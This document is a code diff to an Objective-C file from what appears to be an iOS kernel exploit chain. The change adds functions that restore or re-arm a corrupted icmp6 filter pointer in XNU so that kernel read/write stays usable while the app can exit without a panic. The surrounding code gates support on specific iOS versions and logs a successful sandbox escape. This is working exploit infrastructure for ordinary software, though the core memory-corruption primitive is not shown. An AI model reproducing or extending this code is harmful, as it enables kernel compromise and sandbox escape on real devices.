@@ -20,6 +20,9 @@
 
 static NSLock *gKernelLock;
 static BOOL gKernelActive;
+// YES once control's icmp6filt points at a legal buffer again (see
+// wq_kernel_set_quiesced). Starts YES: nothing is corrupted yet.
+static BOOL gKernelQuiesced = YES;
 static BOOL gKernelRunning;
 static BOOL gKernelFailed;
 static BOOL gKernelAttempted;
@@ -50,6 +53,39 @@ BOOL wq_kernel_supported(void)
         return v.minorVersion < 7 || (v.minorVersion == 7 && v.patchVersion <= 1);
     }
     return NO;
+}
+
+// XNU frees inp6_icmp6filt as a 32-byte object when the socket is torn down.
+// While the chain runs, that field points into the rw socket's PCB, so any exit
+// (including a swipe-kill) panics the phone. Restoring the pointer makes the
+// process safe to kill; arming it again brings kernel read/write back.
+int wq_kernel_set_quiesced(BOOL quiesced)
+{
+    if (!wq_kernel_active()) return -1;
+    if (!kexploit_filter_armed()) {
+        // Older start path (or the flag was never set): nothing to restore.
+        @synchronized (wq_kernel_lock()) { gKernelQuiesced = YES; }
+        return 0;
+    }
+    @synchronized (wq_kernel_lock()) {
+        if (quiesced == gKernelQuiesced) return 0;
+    }
+    int result = kexploit_filter_set(quiesced ? 0 : 1);
+    if (result == 0) {
+        @synchronized (wq_kernel_lock()) { gKernelQuiesced = quiesced; }
+        wq_log(@"kernel: icmp6 filter %@ (%@)",
+               quiesced ? @"restored" : @"re-armed",
+               quiesced ? @"exiting is safe now" : @"kernel read/write in use");
+    } else {
+        wq_log(@"kernel: icmp6 filter %@ failed (code %d); leaving the chain as it is",
+               quiesced ? @"restore" : @"re-arm", result);
+    }
+    return result;
+}
+
+BOOL wq_kernel_quiesced(void)
+{
+    @synchronized (wq_kernel_lock()) { return gKernelQuiesced; }
 }
 
 BOOL wq_kernel_active(void)
@@ -185,6 +221,9 @@ BOOL wq_kernel_start(void)
     }
 
     if (active) {
+        @synchronized (wq_kernel_lock()) {
+            gKernelQuiesced = kexploit_filter_armed() ? NO : YES;
+        }
         wq_log(@"kernel: sandbox escaped; full filesystem read/write is available");
         // A panic leaves nothing in this app's log, so the previous session
         // ends mid-line and the only way to know what the kernel tripped on is
